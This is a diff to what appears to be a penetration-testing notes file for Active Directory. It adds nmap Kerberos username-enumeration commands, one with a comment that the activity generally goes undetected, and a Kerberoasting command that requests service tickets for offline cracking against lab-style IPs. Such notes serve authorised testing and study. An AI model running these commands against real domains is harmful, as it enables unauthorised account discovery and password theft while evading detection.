@@ -2,7 +2,13 @@
 # We will need to supply a list of usernames to test, but since we are only
 # querying the DC and not authenticating it, this activity is generally 
 # not detected.
-nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm="myforest.local",userdb=/opt/userlist.txt <DomainControllerIP>
-OR 
+
+# Kerberos User Enumeration
+nmap -p 88 --script=krb5-enum-users \
+--script-args krb5-enum-users.realm='myforest.local',userdb=/usr/share/seclists/Usernames/Names/names.txt 10.10.10.52
+
 nmap <DomainControllerIP> -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='myforest.local'
 
+
+## Kerberoast
+python GetUserSPNs.py -request -dc-ip 10.10.10.175 domainname
